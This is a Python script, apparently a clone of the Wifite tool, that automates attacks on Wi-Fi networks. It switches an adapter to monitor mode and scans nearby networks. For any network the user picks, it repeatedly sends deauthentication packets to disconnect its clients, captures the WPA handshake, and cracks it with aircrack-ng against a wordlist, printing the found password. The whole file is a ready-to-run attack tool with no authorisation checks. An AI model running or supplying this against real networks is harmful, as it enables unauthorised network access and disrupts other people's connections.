import os
import subprocess
import time
import sys
import re
import signal
from datetime import datetime
from colorama import Fore, Style, init
from typing import List, Dict, Optional
from collections import namedtuple
import logging
import tempfile

# Initialize colorama
init(autoreset=True)

# Initialize logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

# Configuration
WORDLIST = os.getenv("WIFYTE_WORDLIST", "wifyte.txt")  # Path to the wordlist file
TIMEOUT = 180  # Timeout for capturing handshake (3 minutes)
SCAN_DURATION = 30  # Total scanning duration in seconds

Network = namedtuple("Network", ["BSSID", "Channel", "SSID", "Signal", "Encryption"])


def detect_wifi_adapter() -> str:
    logging.info("Detecting Wi-Fi adapter...")
    try:
        result = subprocess.run(
            ["iwconfig"], capture_output=True, text=True, timeout=10
        )
        adapters = [
            line.split()[0]
            for line in result.stdout.split("\n")
            if "IEEE 802.11" in line
        ]
        if not adapters:
            logging.error("No Wi-Fi adapter found that supports monitor mode.")
            sys.exit(1)
        logging.info(f"Supported Wi-Fi adapters: {', '.join(adapters)}")
        return adapters[0]  # Select the first adapter
    except subprocess.TimeoutExpired:
        logging.error("Command timed out.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Failed to detect Wi-Fi adapter: {e}")
        sys.exit(1)


def enable_monitor_mode(interface: str) -> str:
    logging.info(f"Enabling monitor mode on {interface}...")
    try:
        # Kill interfering processes
        subprocess.run(
            ["airmon-ng", "check", "kill"], check=True, stdout=subprocess.DEVNULL
        )

        # Try airmon-ng method first as it's most reliable
        subprocess.run(
            ["airmon-ng", "start", interface], check=True, stdout=subprocess.DEVNULL
        )

        # Check if interface name changed (e.g., wlan0 to wlan0mon)
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        mon_interface = interface

        for line in result.stdout.split("\n"):
            if "Mode:Monitor" in line:
                mon_interface = line.split()[0]
                logging.info(f"Monitor interface: {mon_interface}")
                return mon_interface

        # If we didn't find a monitor interface, check if original interface is in monitor mode
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            logging.info(f"Successfully enabled monitor mode on {interface}")
            return interface

        # Last resort: manually set monitor mode
        logging.info("Trying manual monitor mode method...")
        try:
            subprocess.run(
                ["ip", "link", "set", interface, "down"],
                check=True,
                stdout=subprocess.DEVNULL,
            )
            subprocess.run(
                ["iw", "dev", interface, "set", "type", "monitor"],
                check=True,
                stdout=subprocess.DEVNULL,
            )
            subprocess.run(
                ["ip", "link", "set", interface, "up"],
                check=True,
                stdout=subprocess.DEVNULL,
            )

            # Verify monitor mode
            result = subprocess.run(
                ["iwconfig", interface], capture_output=True, text=True
            )
            if "Mode:Monitor" in result.stdout:
                logging.info(
                    f"Successfully enabled monitor mode manually on {interface}"
                )
                return interface
        except Exception as e:
            logging.warning(f"Manual monitor mode failed: {e}")

        # If we got here, just return original interface and hope for the best
        logging.warning("Could not verify monitor mode, proceeding anyway")
        return interface
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to enable monitor mode: {e}")
        sys.exit(1)


def scan_networks(interface: str) -> List[Network]:
    """
    Scan for wireless networks using airodump-ng and direct CSV output parsing
    """
    temp_dir = tempfile.mkdtemp()
    csv_prefix = os.path.join(temp_dir, "scan")
    csv_file = f"{csv_prefix}-01.csv"

    networks = []
    logging.info(
        f"Scanning for available Wi-Fi networks for {SCAN_DURATION} seconds..."
    )
    logging.debug(f"CSV output will be saved to {csv_file}")

    try:
        # Start airodump-ng process to collect data
        scan_cmd = [
            "airodump-ng",
            "--output-format",
            "csv",
            "--write",
            csv_prefix,
            interface,
        ]
        logging.debug(f"Running command: {' '.join(scan_cmd)}")

        process = subprocess.Popen(
            scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Wait for scan duration
        start_time = time.time()
        while time.time() - start_time < SCAN_DURATION:
            if os.path.exists(csv_file):
                # If file exists, check if it contains data by waiting a bit longer
                time.sleep(5)
                break
            time.sleep(2)

        # Wait additional time to collect data
        if os.path.exists(csv_file):
            time.sleep(SCAN_DURATION - min(SCAN_DURATION, time.time() - start_time))

        # Terminate airodump-ng
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()

        # Debugging info about the CSV file
        if os.path.exists(csv_file):
            file_size = os.path.getsize(csv_file)
            logging.debug(f"CSV file {csv_file} exists, size: {file_size} bytes")

            # Print file content for debugging if file is small
            if file_size < 10000:  # Only debug small files
                with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                    logging.debug(f"CSV file content:\n{f.read()}")
        else:
            logging.error(f"CSV file {csv_file} does not exist after scan")
            print(f"Debug: Checking directory {temp_dir} contents:")
            print(
                subprocess.run(
                    ["ls", "-la", temp_dir], capture_output=True, text=True
                ).stdout
            )
            return []

        # Now try a direct dump using the -w option to see if that works
        network_dump = subprocess.run(
            ["airodump-ng", "--output-format", "csv", "--write", "-", interface],
            capture_output=True,
            text=True,
            timeout=5,
        ).stdout

        logging.debug(f"Direct network dump size: {len(network_dump)} bytes")

        # Process either the CSV file or the direct dump, whichever has data
        if os.path.exists(csv_file) and os.path.getsize(csv_file) > 0:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        elif network_dump:
            content = network_dump
        else:
            logging.error("No network data obtained from either method")
            return []

        # Different parsing approach - line by line instead of section splitting
        lines = content.replace("\r\n", "\n").split("\n")
        ap_section = True
        bssid_idx, channel_idx, encryption_idx, power_idx, essid_idx = (
            -1,
            -1,
            -1,
            -1,
            -1,
        )

        for line in lines:
            line = line.strip()
            if not line:
                continue

            # Check if we're transitioning to Station section
            if "STATION" in line and "PWR" in line:
                ap_section = False
                continue

            if "BSSID" in line and "channel" in line.lower() and "ESSID" in line:
                # This is the header row - extract column indexes
                columns = [col.strip() for col in re.split(r",\s*", line)]

                try:
                    bssid_idx = columns.index("BSSID")

                    # Channel might be labeled differently
                    if "channel" in line.lower():
                        channel_candidates = ["channel", "CH", "chan"]
                        for candidate in channel_candidates:
                            try:
                                channel_idx = next(
                                    i
                                    for i, col in enumerate(columns)
                                    if candidate.lower() in col.lower()
                                )
                                break
                            except StopIteration:
                                continue

                    # Find encryption index - might be labeled as Privacy, ENC, etc.
                    encryption_candidates = ["Privacy", "ENC", "AUTH", "Cipher"]
                    for candidate in encryption_candidates:
                        try:
                            encryption_idx = next(
                                i
                                for i, col in enumerate(columns)
                                if candidate.lower() in col.lower()
                            )
                            break
                        except StopIteration:
                            continue

                    # Power/signal strength index
                    power_candidates = ["PWR", "Power", "dBm", "signal"]
                    for candidate in power_candidates:
                        try:
                            power_idx = next(
                                i
                                for i, col in enumerate(columns)
                                if candidate.lower() in col.lower()
                            )
                            break
                        except StopIteration:
                            continue

                    # ESSID index - usually last column
                    essid_candidates = ["ESSID", "SSID", "Name"]
                    for candidate in essid_candidates:
                        try:
                            essid_idx = next(
                                i
                                for i, col in enumerate(columns)
                                if candidate.lower() in col.lower()
                            )
                            break
                        except StopIteration:
                            continue

                    logging.debug(
                        f"Column indexes - BSSID:{bssid_idx}, CH:{channel_idx}, "
                        f"ENC:{encryption_idx}, PWR:{power_idx}, ESSID:{essid_idx}"
                    )

                    if -1 in [
                        bssid_idx,
                        channel_idx,
                        encryption_idx,
                        power_idx,
                        essid_idx,
                    ]:
                        logging.warning("Could not find all required columns in header")
                except ValueError as e:
                    logging.error(f"Error parsing header row: {e}")
                continue

            # Skip header row and only process AP section
            if not ap_section or any(
                idx == -1
                for idx in [
                    bssid_idx,
                    channel_idx,
                    encryption_idx,
                    power_idx,
                    essid_idx,
                ]
            ):
                continue

            # Try to parse network data
            try:
                # Split by comma but be careful with ESSID which might contain commas
                fields = [f.strip() for f in re.split(r",\s*", line, essid_idx)]

                if len(fields) <= max(
                    bssid_idx, channel_idx, encryption_idx, power_idx, essid_idx
                ):
                    logging.debug(f"Skipping line with insufficient fields: {line}")
                    continue

                bssid = fields[bssid_idx].strip()
                if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                    logging.debug(f"Skipping line with invalid BSSID: {bssid}")
                    continue

                # Get channel
                channel = fields[channel_idx].strip()
                if not channel or not channel.isdigit():
                    channel = "?"

                # Get signal strength
                power = fields[power_idx].strip()
                try:
                    signal = int(power)
                except ValueError:
                    signal = -100

                # Get encryption
                encryption = fields[encryption_idx].strip()
                if not encryption:
                    encryption = "Unknown"

                # Get SSID - might be at the end if it contains commas
                if essid_idx < len(fields):
                    ssid = fields[essid_idx].strip()
                    # Remove any quotes
                    ssid = ssid.strip("\"'")
                    if not ssid or ssid == "<length: 0>":
                        ssid = "<Hidden>"
                else:
                    ssid = "<Hidden>"

                # Create network object
                networks.append(Network(bssid, channel, ssid, signal, encryption))
                logging.debug(f"Added network: {bssid} - {ssid}")

            except Exception as e:
                logging.debug(f"Error parsing network line: {e}, Line: {line}")
                continue

        # Fallback method: try running iwlist scan if airodump didn't work
        if not networks:
            logging.info("No networks found via airodump-ng, trying iwlist scan...")
            try:
                # Temporarily set interface to managed mode
                subprocess.run(
                    ["airmon-ng", "stop", interface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                time.sleep(1)

                # Run iwlist scan
                scan_result = subprocess.run(
                    ["iwlist", interface.replace("mon", ""), "scan"],
                    capture_output=True,
                    text=True,
                    timeout=15,
                ).stdout

                # Set back to monitor mode
                subprocess.run(
                    ["airmon-ng", "start", interface.replace("mon", "")],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

                # Parse iwlist output
                current_network = {}
                for line in scan_result.split("\n"):
                    line = line.strip()

                    if "Cell" in line and "Address:" in line:
                        # New network found, save previous if exists
                        if current_network and "bssid" in current_network:
                            networks.append(
                                Network(
                                    current_network.get("bssid", "Unknown"),
                                    current_network.get("channel", "?"),
                                    current_network.get("ssid", "<Hidden>"),
                                    current_network.get("signal", -100),
                                    current_network.get("encryption", "Unknown"),
                                )
                            )
                        # Start new network
                        current_network = {}
                        bssid_match = re.search(
                            r"Address:\s*([0-9A-F:]{17})", line, re.I
                        )
                        if bssid_match:
                            current_network["bssid"] = bssid_match.group(1)

                    elif "ESSID:" in line:
                        ssid_match = re.search(r'ESSID:"(.*?)"', line)
                        if ssid_match:
                            current_network["ssid"] = ssid_match.group(1) or "<Hidden>"

                    elif "Channel:" in line:
                        channel_match = re.search(r"Channel:(\d+)", line)
                        if channel_match:
                            current_network["channel"] = channel_match.group(1)

                    elif "Signal level=" in line:
                        signal_match = re.search(r"Signal level=(-?\d+)", line)
                        if signal_match:
                            current_network["signal"] = int(signal_match.group(1))

                    elif "Encryption key:" in line:
                        if "on" in line.lower():
                            current_network["encryption"] = "WPA/WPA2"
                        else:
                            current_network["encryption"] = "Open"

                # Add the last network if exists
                if current_network and "bssid" in current_network:
                    networks.append(
                        Network(
                            current_network.get("bssid", "Unknown"),
                            current_network.get("channel", "?"),
                            current_network.get("ssid", "<Hidden>"),
                            current_network.get("signal", -100),
                            current_network.get("encryption", "Unknown"),
                        )
                    )

                logging.info(f"Found {len(networks)} networks via iwlist scan")
            except Exception as e:
                logging.error(f"iwlist scan failed: {e}")

    except Exception as e:
        logging.error(f"Failed to scan networks: {e}")
    finally:
        # Clean up temporary files
        try:
            for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.cap"]:
                temp_path = f"{csv_prefix}{ext}"
                if os.path.exists(temp_path):
                    os.remove(temp_path)
            if os.path.exists(temp_dir):
                os.rmdir(temp_dir)
        except Exception as e:
            logging.debug(f"Error cleaning up temporary files: {e}")

    # Sort networks by signal strength (best first)
    networks = [
        n for n in networks if n.BSSID != "Unknown"
    ]  # Filter out incomplete networks
    networks.sort(
        key=lambda x: x.Signal if isinstance(x.Signal, int) else -999, reverse=True
    )

    if not networks:
        logging.warning("No networks detected. Please try again.")
        return []

    logging.info(f"Found {len(networks)} networks:")
    for i, network in enumerate(networks):
        signal_strength = (
            abs(network.Signal) if isinstance(network.Signal, int) else 100
        )
        if signal_strength <= 50:
            color = Fore.GREEN  # Strong signal
        elif 50 < signal_strength <= 70:
            color = Fore.YELLOW  # Moderate signal
        else:
            color = Fore.RED  # Weak signal

        print(
            f"{i + 1}. {color}SSID: {network.SSID}, BSSID: {network.BSSID}, "
            f"Channel: {network.Channel}, Signal: {network.Signal} dBm, "
            f"Encryption: {network.Encryption}"
        )

    return networks


def deauth_attack(interface: str, bssid: str, channel: str):
    logging.info(f"Performing deauthentication attack on BSSID: {bssid}...")
    try:
        # Set channel first
        subprocess.run(
            ["iwconfig", interface, "channel", channel],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Send deauth packets
        subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        logging.info("Deauthentication attack completed")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to perform deauthentication attack: {e}")


def capture_handshake(
    interface: str, bssid: str, channel: str, ssid: str
) -> Optional[str]:
    logging.info(f"Attempting to capture handshake from {ssid} ({bssid})...")
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    cap_basename = f"handshake_{timestamp}"
    cap_file = f"{cap_basename}-01.cap"

    # Set channel first
    try:
        subprocess.run(
            ["iwconfig", interface, "channel", channel],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except subprocess.CalledProcessError:
        logging.warning(f"Failed to set channel {channel}, continuing anyway...")

    start_time = time.time()
    capture_process = None

    try:
        # Start airodump-ng to capture handshake
        capture_process = subprocess.Popen(
            [
                "airodump-ng",
                "--bssid",
                bssid,
                "--channel",
                channel,
                "--write",
                cap_basename,
                interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Loop until we either capture a handshake or timeout
        capture_attempts = 0
        max_attempts = 5

        while time.time() - start_time < TIMEOUT:
            # Run deauth attack after a brief delay
            time.sleep(5)

            if capture_attempts < max_attempts:
                logging.info(f"Deauth attempt {capture_attempts + 1}/{max_attempts}")
                deauth_attack(interface, bssid, channel)
                capture_attempts += 1

            # Check if we've captured a handshake
            if os.path.exists(cap_file):
                # Check if file has handshake using aircrack-ng
                check_process = subprocess.run(
                    ["aircrack-ng", cap_file], capture_output=True, text=True
                )

                if (
                    bssid.lower() in check_process.stdout.lower()
                    and "WPA" in check_process.stdout
                ):
                    logging.info(f"Handshake successfully captured for {ssid}!")
                    return cap_file

            time.sleep(10)

        logging.error(
            f"Failed to capture handshake for {ssid} after {TIMEOUT} seconds."
        )
        return None

    except Exception as e:
        logging.error(f"Error during handshake capture: {e}")
        return None
    finally:
        # Terminate airodump-ng process
        if capture_process:
            capture_process.terminate()
            try:
                capture_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                capture_process.kill()


def crack_handshake(cap_file: str, wordlist: str, target_bssid: str, ssid: str) -> bool:
    if not os.path.exists(wordlist):
        logging.error(f"Wordlist file not found: {wordlist}")
        return False

    logging.info(f"Starting cracking process using wordlist: {wordlist}...")
    try:
        # Get total password count
        wc_process = subprocess.run(
            ["wc", "-l", wordlist], capture_output=True, text=True
        )
        total_passwords = int(wc_process.stdout.split()[0])
        logging.info(f"Total passwords to test: {total_passwords}")

        # Run aircrack-ng to crack the handshake
        process = subprocess.Popen(
            ["aircrack-ng", "-w", wordlist, "-b", target_bssid, cap_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
        )

        # Show progress
        password_tested = 0
        found_password = None

        for line in iter(process.stdout.readline, ""):
            if "KEY FOUND!" in line:
                # Extract password
                match = re.search(r"KEY FOUND! \[ (.*?) \]", line)
                if match:
                    found_password = match.group(1)
                break

            # Update progress
            if "keys tested" in line.lower():
                match = re.search(r"(\d+)/(\d+)", line)
                if match:
                    password_tested = int(match.group(1))
                    if password_tested % 5000 == 0:
                        percent = (password_tested / total_passwords) * 100
                        logging.info(
                            f"Progress: {password_tested}/{total_passwords} ({percent:.2f}%)"
                        )

        # Wait for process to complete
        process.wait()

        if found_password:
            logging.info(
                f"Password for {ssid} ({target_bssid}) successfully cracked: {found_password}"
            )
            return True
        else:
            logging.warning(f"Password for {ssid} not found in wordlist.")
            return False

    except Exception as e:
        logging.error(f"Failed to crack handshake: {e}")
        return False


def disable_monitor_mode(interface: str):
    logging.info(f"Disabling monitor mode on {interface}...")
    try:
        # Try using airmon-ng first
        subprocess.run(
            ["airmon-ng", "stop", interface], check=False, stdout=subprocess.DEVNULL
        )

        # If that didn't work, try manual method
        subprocess.run(
            ["ip", "link", "set", interface, "down"],
            check=False,
            stdout=subprocess.DEVNULL,
        )
        subprocess.run(
            ["iw", "dev", interface, "set", "type", "managed"],
            check=False,
            stdout=subprocess.DEVNULL,
        )
        subprocess.run(
            ["ip", "link", "set", interface, "up"],
            check=False,
            stdout=subprocess.DEVNULL,
        )

        # Restart network services
        subprocess.run(
            ["systemctl", "restart", "NetworkManager"],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        logging.info("Monitor mode disabled successfully")
    except Exception as e:
        logging.error(f"Failed to disable monitor mode: {e}")


def main():
    print(
        f"{Fore.CYAN}{Style.BRIGHT}===== Wifite Clone - Handshake Capture Tool ====={Style.RESET_ALL}"
    )

    # Check if running as root
    if os.geteuid() != 0:
        logging.error("This program must be run as root. Try using sudo.")
        sys.exit(1)

    # Check if required tools are installed
    required_tools = [
        "airmon-ng",
        "airodump-ng",
        "aireplay-ng",
        "aircrack-ng",
        "iwconfig",
    ]
    missing_tools = []

    for tool in required_tools:
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            missing_tools.append(tool)

    if missing_tools:
        logging.error(f"Missing required tools: {', '.join(missing_tools)}")
        logging.error("Please install aircrack-ng suite: sudo apt install aircrack-ng")
        sys.exit(1)

    # Set up signal handler for clean exit
    def signal_handler(sig, frame):
        logging.info("Interrupted. Cleaning up...")
        if "monitor_interface" in locals():
            disable_monitor_mode(monitor_interface)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    adapter = detect_wifi_adapter()
    monitor_interface = enable_monitor_mode(adapter)

    # Print detailed adapter info for debugging
    print(f"{Fore.GREEN}=== Adapter Information ===")
    subprocess.run(["iwconfig", monitor_interface])
    print(f"=========================={Style.RESET_ALL}")

    try:
        while True:
            networks = scan_networks(monitor_interface)

            if not networks:
                retry = input("No networks found. Retry scan? (y/n): ").lower()
                if retry != "y":
                    break
                continue

            try:
                choice = (
                    int(
                        input(
                            f"{Fore.YELLOW}Enter the number of the network you want to test (1-{len(networks)}): {Style.RESET_ALL}"
                        )
                    )
                    - 1
                )
                if choice < 0 or choice >= len(networks):
                    logging.error("Invalid selection.")
                    continue
            except ValueError:
                logging.error("Please enter a valid number.")
                continue

            target = networks[choice]
            TARGET_BSSID = target.BSSID
            TARGET_SSID = target.SSID

            logging.info(
                f"Target selected: SSID: {TARGET_SSID}, BSSID: {TARGET_BSSID}, "
                f"Channel: {target.Channel}, Encryption: {target.Encryption}"
            )

            if "WPA" not in target.Encryption and "WEP" not in target.Encryption:
                logging.warning(
                    f"Network {TARGET_SSID} appears to use {target.Encryption} encryption, which may not be compatible with handshake capture."
                )
                continue_anyway = input("Continue anyway? (y/n): ").lower()
                if continue_anyway != "y":
                    continue

            cap_file = capture_handshake(
                monitor_interface, TARGET_BSSID, target.Channel, TARGET_SSID
            )
            if not cap_file:
                logging.error("Test failed. No handshake captured.")
                retry = input("Try another network? (y/n): ").lower()
                if retry != "y":
                    break
                continue

            # Confirm wordlist exists or get a new one
            while not os.path.exists(WORDLIST):
                WORDLIST = input(
                    f"Wordlist {WORDLIST} not found. Enter path to wordlist: "
                )
                if not WORDLIST:
                    logging.error("Wordlist is required for cracking.")
                    break

            if not os.path.exists(WORDLIST):
                logging.error("No valid wordlist provided. Skipping cracking phase.")
                retry = input("Try another network? (y/n): ").lower()
                if retry != "y":
                    break
                continue

            success = crack_handshake(cap_file, WORDLIST, TARGET_BSSID, TARGET_SSID)
            if not success:
                logging.warning("Cracking failed. Password not found in wordlist.")

            retry = input("Try another network? (y/n): ").lower()
            if retry != "y":
                break

    finally:
        choice = input("Do you want to disable monitor mode? (y/n): ").lower()
        if choice == "y":
            disable_monitor_mode(monitor_interface)
        logging.info("Program finished.")


if __name__ == "__main__":
    main()
